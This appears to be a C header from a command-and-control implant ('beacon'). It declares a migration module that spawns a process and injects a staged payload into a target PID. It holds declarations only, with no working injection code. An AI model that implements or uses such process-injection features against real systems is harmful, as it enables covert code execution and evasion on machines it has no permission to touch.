#pragma once

#include "beacon_common.h"
#include "beacon_context.h"
#include "beacon_packet.h"

#define MIGRATE_SUBCMD_SET_SPAWNTO     1u
#define MIGRATE_SUBCMD_SPAWN_STAGE     2u
#define MIGRATE_SUBCMD_INJECT_STAGE    3u

#define MIGRATE_ARCH_MAX 16u
#define MIGRATE_CMDLINE_MAX 2048u
#define MIGRATE_ERROR_MAX 256u

typedef struct MigrateRequest {
    UINT32 subcmd;
    DWORD target_pid;
    CHAR arch[MIGRATE_ARCH_MAX];
    CHAR spawn_path[MAX_PATH];
    CHAR spawn_args[MIGRATE_CMDLINE_MAX];
    ByteBuf stage;
} MigrateRequest;

ByteBuf MigrateHandle(BeaconContext* ctx, UINT32 task_id, Parser* parser);

BOOL MigrateSpawnStage(const MigrateRequest* req, DWORD* pid,
                       CHAR* status, SIZE_T status_size,
                       CHAR* err, SIZE_T err_size);
BOOL MigrateInjectStage(const MigrateRequest* req,
                        CHAR* status, SIZE_T status_size,
                        CHAR* err, SIZE_T err_size);
